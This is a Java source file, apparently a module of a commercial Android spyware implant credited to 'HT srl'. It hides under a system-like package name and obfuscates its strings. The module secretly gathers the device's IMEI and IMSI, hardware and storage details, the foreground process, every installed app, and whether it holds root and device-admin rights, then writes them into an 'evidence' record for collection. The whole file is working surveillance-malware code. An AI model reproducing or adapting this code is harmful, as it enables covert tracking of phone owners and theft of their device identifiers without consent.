/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.deviceinfo.module;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Properties;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;

import com.android.deviceinfo.Device;
import com.android.deviceinfo.RunningProcesses;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfModule;
import com.android.deviceinfo.evidence.EvidenceBuilder;
import com.android.deviceinfo.evidence.EvidenceType;
import com.android.deviceinfo.listener.AR;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.WChar;
import com.android.m.M;

/**
 * http://android.git.kernel.org/?p=platform/packages/apps/Settings.git;a=tree;f
 * =src/com/android/settings;h=1d1b538ef4728c9559da43828a7df9e9bb5c512f;hb=HEAD
 * 
 * @author zeno
 * 
 */
public class ModuleDevice extends BaseInstantModule {

	/** The Constant TAG. */
	private static final String TAG = "ModuleDevice"; //$NON-NLS-1$

	/** The process list. */
	private boolean processList = true;

	/** The cpu usage. */
	private float cpuUsage;

	/** The cpu total. */
	private long cpuTotal;

	/** The cpu idle. */
	private long cpuIdle;

	/**
	 * Instantiates a new device agent.
	 */
	public ModuleDevice() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " DeviceAgent constructor");//$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		// this.processList = true;
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void actualStart() {

		final StringBuffer sb = new StringBuffer();

		try {
			// OS Version etc...
			if (Cfg.DEBUG) {
				Check.log(TAG + " Android");//$NON-NLS-1$
			}

			final Runtime runtime = Runtime.getRuntime();
			
			readCpuUsage();

			if (Cfg.DEBUG) {
				sb.append("Debug\n"); //$NON-NLS-1$
				final String timestamp = System.getProperty("build.timestamp"); //$NON-NLS-1$
				if (timestamp != null) {
					sb.append(timestamp + "\n"); //$NON-NLS-1$
				}
			}

			long freeSpace = getSystem(sb);
			int battery = getBattery(sb);
			getProperties(sb);
			getProcessList(sb);
			
			ComponentName devAdminReceiver = new ComponentName(Status.getAppContext(), AR.class);
			DevicePolicyManager dpm = (DevicePolicyManager) Status.getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
			boolean admin = dpm.isAdminActive(devAdminReceiver);
			boolean root = Status.self().haveRoot();
			
			sb.insert(0,  M.e("Admin: ") + (admin?"yes":"no") + "\n"); //$NON-NLS-1$
			sb.insert(0, M.e("Root: ") + (root?"yes":"no") + "\n"); //$NON-NLS-1$
			sb.insert(0, M.e("Free space: ") + freeSpace + " KB\n");
			sb.insert(0, M.e("Battery: ") + battery + "%\n");
			
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) Error: " + ex);
			}
		}

		final String content = sb.toString();

		// log
		final EvidenceBuilder log = new EvidenceBuilder(EvidenceType.DEVICE);
		log.write(WChar.getBytes(content, true));
		log.close();

	}

	private void getProcessList(final StringBuffer sb) {
		if (processList) {
			sb.append(M.e("\n-- INSTALLED APPS --") + "\n"); //$NON-NLS-1$
			final ArrayList<PInfo> apps = getInstalledApps(false);
			final int max = apps.size();

			for (int i = 0; i < max; i++) {
				sb.append(apps.get(i) + "\n"); //$NON-NLS-1$
			}
		}
	}

	private void getProperties(final StringBuffer sb) {
		final Properties properties = System.getProperties();
		
		sb.append(M.e("\n-- PROPERTIES --") + "\n"); //$NON-NLS-1$
		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();

		while (it.hasNext()) {
			final Entry<Object, Object> pairs = it.next();
			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}
	}

	private long getSystem(final StringBuffer sb) {
		// SYSTEM
		sb.append(M.e("\n-- SYSTEM --") + "\n"); //$NON-NLS-1$
		sb.append(M.e("Board: ") + Build.BOARD + "\n");
		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
		sb.append(M.e("Device: ") + Build.DEVICE + "\n");
		sb.append(M.e("Display: ") + Build.MODEL + "\n");
		sb.append(M.e("Model:") + Build.DISPLAY + "\n");

		sb.append(M.e("IMEI: ") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		if (Device.self().getImei().length() == 0) {
			sb.append(M.e("IMSI: SIM not present") + "\n"); //$NON-NLS-1$
		} else {
			sb.append(M.e("IMSI: ") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		sb.append(M.e("CpuUsage: ") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		sb.append(M.e("CpuTotal: ") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		sb.append(M.e("CpuIdle: ") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
		long bytesAvailableInt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
		sb.append(M.e("Internal space: ") + bytesAvailableInt + "\n");

		stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
		long bytesAvailableExt = (long) stat.getBlockSize() * (long) stat.getBlockCount();

		sb.append(M.e("External state: ") + Environment.getExternalStorageState() + "\n");
		sb.append(M.e("External space: ") + bytesAvailableExt + "\n");


		RunningProcesses runningProcesses = new RunningProcesses();
		sb.append(M.e("Foreground process: ") +runningProcesses.getForeground() + "\n"); //$NON-NLS-1$
		
		return bytesAvailableInt / 1024;
	}

	private int getBattery(final StringBuffer sb) {
		sb.append(M.e("\n-- BATTERY --") + "\n");
		
		IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		Intent batteryStatus = Status.self().getAppContext().registerReceiver(null, ifilter);
		// Are we charging / charged?
		int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
		boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
		                     status == BatteryManager.BATTERY_STATUS_FULL;
		
		sb.append(M.e("Charging: ") + isCharging + "\n");

		// How are we charging?
		int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
		boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
		boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
		
		sb.append(M.e("Charging USB: ") + usbCharge + "\n");
		sb.append(M.e("Charging AC: ") + acCharge + "\n");
		
		int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
		int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

		
		float levelBattery = level / (float) scale;
		sb.append(M.e("level: ") + levelBattery + "\n");
		
		int batteryPct = level * 100 / scale ;
		return batteryPct;
	}

	/**
	 * Read cpu usage.
	 */
	private void readCpuUsage() {
		try {
			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(
					M.e("/proc/stat"))), //$NON-NLS-1$
					1000);
			final String load = reader.readLine();
			reader.close();

			final String[] toks = load.split(" "); //$NON-NLS-1$

			final long currTotal = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
			final long currIdle = Long.parseLong(toks[5]);

			this.cpuUsage = ((currTotal - cpuTotal) * 100.0f / (currTotal - cpuTotal + currIdle - cpuIdle));
			this.cpuTotal = currTotal;
			this.cpuIdle = currIdle;
		} catch (final IOException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
			}
		}
	}

	/**
	 * The Class PInfo.
	 */
	class PInfo {
		/** The appname. */
		private String appname = ""; //$NON-NLS-1$

		/** The pname. */
		private String pname = ""; //$NON-NLS-1$

		/** The version name. */
		private String versionName = ""; //$NON-NLS-1$

		/** The version code. */
		private int versionCode = 0;

		/*
		 * (non-Javadoc)
		 * 
		 * @see java.lang.Object#toString()
		 */
		@Override
		public String toString() {
			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
		}
	}

	/**
	 * Gets the packages.
	 * 
	 * @return the packages
	 */
	private ArrayList<PInfo> getPackages() {
		final ArrayList<PInfo> apps = getInstalledApps(false); /*
																 * false = no
																 * system
																 * packages
																 */
		final int max = apps.size();

		for (int i = 0; i < max; i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
			}
		}

		return apps;
	}

	/**
	 * Gets the installed apps.
	 * 
	 * @param getSysPackages
	 *            the get sys packages
	 * @return the installed apps
	 */
	private ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
		final ArrayList<PInfo> res = new ArrayList<PInfo>();
		final PackageManager packageManager = Status.getAppContext().getPackageManager();

		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);

		for (int i = 0; i < packs.size(); i++) {
			final PackageInfo p = packs.get(i);

			if ((!getSysPackages) && (p.versionName == null)) {
				continue;
			}

			try {
				final PInfo newInfo = new PInfo();
				newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
				newInfo.pname = p.packageName;
				newInfo.versionName = p.versionName;
				newInfo.versionCode = p.versionCode;
				res.add(newInfo);
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getInstalledApps) Error: " + e);
				}
			}
		}

		return res;
	}
}
